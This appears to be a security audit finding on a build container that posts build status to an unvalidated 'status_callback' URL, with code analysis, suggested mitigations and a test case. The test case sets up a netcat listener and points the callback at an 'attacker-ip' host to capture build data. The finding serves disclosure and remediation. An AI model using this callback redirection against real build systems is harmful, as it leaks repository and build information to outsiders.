### Vulnerability List

- Vulnerability Name: Status Callback URL Injection
- Description:
    1. An attacker can control the `status_callback` parameter during the build process. This parameter is intended to be a URL where the build container sends notifications about the build status (success, error, processing, timeout).
    2. The application takes the `status_callback` URL from the build arguments without any validation or sanitization.
    3. When the build process reaches a completion state (success, error, or timeout), the application sends an HTTP POST request to the URL specified in `status_callback`.
    4. By injecting a malicious URL into the `status_callback` parameter, an attacker can redirect these build status notifications to an attacker-controlled server.
    5. This allows the attacker to intercept and inspect the content of these POST requests, which may contain sensitive build information such as repository details, branch names, and potentially error messages that reveal internal configurations or vulnerabilities.
- Impact:
    - Information Disclosure: An attacker can gain access to sensitive build information that is included in the status callback notifications. This information could include details about the repository, branch, build status, and potentially error messages that expose internal configurations.
    - Potential for Further Attacks: By controlling the notification endpoint, an attacker might be able to use the intercepted information to plan further attacks or to trigger unintended actions based on the build status. For example, if the notification includes details about successful builds and deployed versions, it could aid in identifying attack targets and potential vulnerabilities in specific versions of the deployed website.
- Vulnerability Rank: Medium
- Currently Implemented Mitigations:
    - None. The application directly uses the provided `status_callback` URL without any checks or sanitization.
- Missing Mitigations:
    - Input validation and sanitization for the `status_callback` URL are missing.
    - Implement a whitelist of allowed domains or URL patterns for the `status_callback`.
    - Sanitize the `status_callback` URL to prevent injection of malicious code or unintended characters.
    - Consider encrypting sensitive information within the status callback payload if exfiltration is a major concern, even though preventing the injection is the primary goal.
- Preconditions:
    - An attacker must be able to influence the build arguments provided to the `main.py` script. This is possible if the build process is triggered by an external system where the attacker can manipulate the input parameters, specifically the `status_callback` parameter.
- Source Code Analysis:
    1. **`src/main.py`**:
        - The `main.py` script uses `argparse` to parse command-line arguments, including `-p/--params` and `-f/--file` to receive build parameters.
        - If the `-p/--params` argument is used, the `decrypt_params` function is called to decrypt the parameters. This function, however, does not validate the content of the parameters, including the `status_callback`.
        - The `build` function from `src/build.py` is called with these parameters, including the `status_callback` URL.
    2. **`src/build.py`**:
        - The `build` function receives `status_callback` as an argument.
        - It then calls functions from `src/log_utils/remote_logs.py` like `post_build_processing`, `post_build_complete`, `post_build_error`, and `post_build_timeout`, passing the `status_callback` URL directly to these functions.
    3. **`src/log_utils/remote_logs.py`**:
        - Functions like `post_status`, `post_build_complete`, `post_build_error`, `post_build_timeout`, and `post_metrics` take the `status_callback_url` as input.
        - These functions use `requests.post(status_callback_url, ...)` to send HTTP POST requests to the provided URL.
        - There is no validation or sanitization of `status_callback_url` before it is used in the `requests.post` call.

    ```
    src/main.py:
    ...
    if args.params:
        params = json.loads(args.params)
        params = decrypt_params(params)  # Parameters are decrypted, but not validated for malicious URLs

    build_arguments = inspect.getfullargspec(build)[0]
    kwargs = {k: v for (k, v) in params.items() if k in build_arguments} # kwargs includes status_callback

    build(**kwargs) # status_callback is passed to build function

    src/build.py:
    def build(..., status_callback, ...):
        ...
        post_build_processing(status_callback) # status_callback is passed to post_build_processing
        ...
        post_build_complete(status_callback, commit_sha) # status_callback is passed to post_build_complete
        ...

    src/log_utils/remote_logs.py:
    def post_status(status_callback_url, status, output='', commit_sha=None):
        requests.post( # status_callback_url is used directly in requests.post without validation
            status_callback_url,
            json={
                'status': status,
                'message': b64string(output),
                'commit_sha': commit_sha,
            },
            timeout=10
        )
    ```

- Security Test Case:
    1. **Setup Attacker Server:**
        - Use `netcat` to set up a simple listener on your attacker machine to capture HTTP requests.
        - Open a terminal and run: `nc -lvp 8080` (or any port you prefer).
    2. **Craft Malicious URL:**
        - Identify the public IP address or hostname of your attacker machine.
        - Create a malicious `status_callback` URL pointing to your netcat listener, for example: `http://<attacker-ip>:8080/`.
    3. **Initiate Build with Malicious URL:**
        - Prepare a build parameter JSON. Include all required parameters like `aws_access_key_id`, `aws_secret_access_key`, `aws_default_region`, `bucket`, `generator`, `owner`, `repository`, `branch`, and importantly, set `status_callback` to the malicious URL created in the previous step.
        - Example `build_params.json`:
            ```json
            {
              "aws_access_key_id": "YOUR_AWS_ACCESS_KEY_ID",
              "aws_secret_access_key": "YOUR_AWS_SECRET_ACCESS_KEY",
              "aws_default_region": "YOUR_AWS_REGION",
              "bucket": "YOUR_S3_BUCKET_NAME",
              "generator": "static",
              "owner": "test-owner",
              "repository": "test-repo",
              "branch": "main",
              "site_prefix": "test-site",
              "status_callback": "http://<attacker-ip>:8080/"
            }
            ```
        - Run the build container using Docker Compose, providing the build parameters file:
          ```bash
          docker-compose run --rm app python main.py -f /tmp/local/build_params.json
          ```
          (Make sure to replace `<attacker-ip>` with your attacker machine's IP and fill in the AWS credentials and bucket details with valid or dummy values if you are testing locally and not actually publishing to S3).
    4. **Observe Attacker Server Logs:**
        - Check the terminal where you ran `netcat`.
        - After the build process in the container completes (or fails), you should see an incoming HTTP POST request logged by netcat.
        - The request will contain the build status information sent by the build container to the attacker-controlled URL.
    5. **Inspect Captured Data:**
        - Examine the captured HTTP POST request data. It should contain a JSON payload with `status`, `message` (base64 encoded), and `commit_sha`. The `message` might contain sensitive build details when decoded.

This test case demonstrates that an attacker can successfully intercept build status notifications by injecting a malicious URL into the `status_callback` parameter, confirming the vulnerability.